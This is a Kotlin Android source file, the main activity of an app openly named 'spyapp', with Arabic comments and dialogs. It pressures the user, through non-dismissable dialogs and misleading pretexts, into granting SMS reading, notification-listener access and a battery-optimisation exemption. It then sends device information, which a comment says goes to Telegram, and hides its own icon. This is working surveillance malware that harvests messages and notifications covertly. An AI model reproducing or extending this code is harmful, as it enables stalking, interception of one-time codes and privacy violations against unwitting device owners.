package com.spyapp

import android.Manifest
import android.app.AlertDialog
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.spyapp.utils.HideApp
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity() {

    private val SMS_PERMISSIONS = arrayOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // التحقق من الصلاحيات بالترتيب
        if (!hasSMSPermissions()) {
            requestSMSPermissions()
        } else if (!isNotificationListenerEnabled()) {
            requestNotificationAccess()
        } else if (!isIgnoringBatteryOptimizations()) {
            requestBatteryOptimization()
        } else {
            activateAndHide()
        }
    }

    override fun onResume() {
        super.onResume()
        // بعد عودة المستخدم من الإعدادات
        if (hasSMSPermissions() && isNotificationListenerEnabled()) {
            activateAndHide()
        }
    }

    private fun hasSMSPermissions(): Boolean {
        return SMS_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestSMSPermissions() {
        ActivityCompat.requestPermissions(
            this,
            SMS_PERMISSIONS,
            1001
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1001) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                // انتقل للإشعارات
                requestNotificationAccess()
            } else {
                // رُفضت — أطلب ثانية
                AlertDialog.Builder(this)
                    .setTitle("تنبيه مهم")
                    .setMessage("الصلاحيات مطلوبة لعمل التطبيق. أعد المحاولة.")
                    .setPositiveButton("إعادة") { _, _ -> requestSMSPermissions() }
                    .setCancelable(false)
                    .show()
            }
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        return flat != null && flat.contains(packageName)
    }

    private fun requestNotificationAccess() {
        AlertDialog.Builder(this)
            .setTitle("تفعيل الإشعارات")
            .setMessage("لتفعيل الخدمة، سيتم توجيهك لتفعيل صلاحية الوصول للإشعارات.")
            .setPositiveButton("تفعيل") { _, _ ->
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            }
            .setCancelable(false)
            .show()
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestBatteryOptimization() {
        AlertDialog.Builder(this)
            .setTitle("تحسين الأداء")
            .setMessage("لضمان استمرار عمل التطبيق، يرجى تعطيل تحسين البطارية.")
            .setPositiveButton("تعطيل") { _, _ ->
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
            .setCancelable(false)
            .show()
    }

    private fun activateAndHide() {
        // إرسال رسالة تأكيد للتليغرام
        DeviceInfo.collectAndSend(this)

        // إخفاء الأيقونة
        HideApp.hide(this)
    }
}
